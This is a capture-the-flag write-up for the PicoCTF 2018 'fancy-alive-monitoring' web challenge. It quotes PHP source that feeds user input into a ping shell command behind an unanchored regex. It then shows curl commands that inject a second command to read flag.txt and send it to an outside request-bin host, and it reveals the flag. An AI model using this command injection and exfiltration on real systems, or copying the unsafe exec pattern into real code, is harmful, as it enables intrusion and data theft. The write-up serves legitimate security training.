---
layout: posts
title:  Pico CTF 2018 - fancy-alive-monitoring (Web)
date:   2018-09-27
categories: [CTFs, pico18]
---

[~$ cd ..](/ctfs/pico18/2018/09/27/index.html)

>One of my school mate developed an alive monitoring tool.
>Can you get a flag from http://2018shell1.picoctf.com:43316 (link)?

We are landed in front of a really simple website:

![site](/assets/res/CTFs/pico18/fancy_alive_mon/site.png)

The source we are given is as follows:

> ```html
><html>
><head>
>	<title>Monitoring Tool</title>
>	<script>
>	function check(){
>		ip = document.getElementById("ip").value;
>		chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
>		if (!chk) {
>			alert("Wrong IP format.");
>			return false;
>		} else {
>			document.getElementById("monitor").submit();
>		}
>	}
>	</script>
></head>
><body>
>	<h1>Monitoring Tool ver 0.1</h1>
>	<form id="monitor" action="index.php" method="post" onsubmit="return false;">
>	<p> Input IP address of the target host
>	<input id="ip" name="ip" type="text">
>	</p>
>	<input type="button" value="Go!" onclick="check()">
>	</form>
>	<hr>
>
><?php
>$ip = $_POST["ip"];
>if ($ip) {
>	// super fancy regex check!
>	if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) {
>		exec('ping -c 1 '.$ip, $cmd_result);
>		foreach($cmd_result as $str){
>			if (strpos($str, '100% packet loss') !== false){
>				printf("<h3>Target is NOT alive.</h3>");
>				break;
>			} else if (strpos($str, ', 0% packet loss') !== false){
>				printf("<h3>Target is alive.</h3>");
>				break;
>			}
>		}
>	} else {
>		echo "Wrong IP Format.";
>	}
>}
>?>
><hr>
><a href="index.txt">index.php source code</a>
></body>
></html>
> ```

Fancy regex on server side, uh? Well, for some unknown reason, the regex's are not the same! On the server, we can append data at the end.
However, we had to find a way to exfiltrate the result of the command, since it's not displayed by the actual script.

We first created a temporary URL grabber on [postb.in](https://postb.in/), and then used `curl` to bypass the Javascript sanity check:

> ```sh
>% curl --data 'ip=8.8.8.8 1> /dev/null; wget "http://postb.in/tAZgj8lO?p=$(cat flag.txt)"' http://2018shell1.picoctf.com:43316/ -v
>% curl --data 'ip=8.8.8.8 1> /dev/null; curl "http://postb.in/tAZgj8lO?p=$(cat flag.txt)"' http://2018shell1.picoctf.com:43316/ -v
> ```

The first part of the command redirects the standard output of the command to `/dev/null`, which allows the PHP script to continue until the end. The second
part, after the semi-colon exfiltrate the flag, and we got: **picoCTF{n3v3r_trust_a_b0x_c4a9b715}**
